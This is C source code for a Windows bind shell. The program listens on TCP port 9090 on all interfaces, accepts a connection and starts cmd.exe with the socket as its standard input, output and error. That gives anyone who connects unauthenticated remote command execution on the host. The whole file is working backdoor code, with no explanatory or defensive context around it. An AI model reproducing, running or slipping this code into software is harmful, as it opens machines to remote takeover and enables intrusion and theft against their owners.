#include <winsock2.h> 
#include <stdio.h> 
#pragma comment(lib,"Ws2_32") 

#define LISTEN_PORT 9090
int main() {
	WSADATA ws;
	SOCKET listenFD;
	int ret;
	WSAStartup(MAKEWORD(2, 2), &ws);
	listenFD = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	struct sockaddr_in server;
	server.sin_family = AF_INET;
	server.sin_port = htons(LISTEN_PORT);
	server.sin_addr.s_addr = ADDR_ANY;
	ret = bind(listenFD, (sockaddr *) &server, sizeof(server));
	if (SOCKET_ERROR == ret) {
		wprintf(L"bind failed:%d", WSAGetLastError());
		return 0;
	}
	ret = listen(listenFD, 2);
	if (SOCKET_ERROR == ret) {
		wprintf(L"listen failed:%d", WSAGetLastError());
		return 0;
	}
	int iAddrSize = sizeof(server);
	SOCKET clientFD = accept(listenFD, (sockaddr *) &server, &iAddrSize);
	if (INVALID_SOCKET == clientFD) {
		wprintf(L"accept failed:%d", WSAGetLastError());
		return 0;
	}
	STARTUPINFO si;
	ZeroMemory(&si, sizeof(si));
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdInput = si.hStdOutput = si.hStdError = (void *) clientFD;
	PROCESS_INFORMATION pi;
	TCHAR app_spawn[] = TEXT("C:\\WINDOWS\\system32\\cmd.exe");
	if (!CreateProcess(app_spawn, NULL, NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi)) {
		wprintf(L"CreateProcess failed:%d", GetLastError());
		return 0;
	}
	return 0;
}
